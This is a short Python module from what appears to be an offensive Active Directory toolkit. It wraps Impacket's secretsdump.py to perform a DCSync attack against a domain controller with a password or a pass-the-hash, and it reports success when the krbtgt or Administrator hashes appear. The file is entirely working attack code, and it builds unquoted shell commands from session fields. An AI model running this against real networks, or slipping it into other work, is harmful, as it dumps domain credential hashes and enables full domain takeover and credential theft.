# modules/dcsync.py

import subprocess

def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90)
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        return "", str(e)

def attack_dcsync(session):
    print(f"[*] Attempting DCSync using secretsdump.py against {session.dc_ip}...")

    if session.hash:
        cmd = (
            f"secretsdump.py {session.domain}/{session.username}@{session.dc_ip} "
            f"-hashes :{session.hash}"
        )
    else:
        cmd = (
            f"secretsdump.py {session.domain}/{session.username}:{session.password}@{session.dc_ip}"
        )

    out, err = run_command(cmd)
    if "krbtgt" in out or "Administrator" in out:
        print(f"[+] DCSync successful:\n{out}")
    else:
        print(f"[-] DCSync failed:\n{err if err else out}")

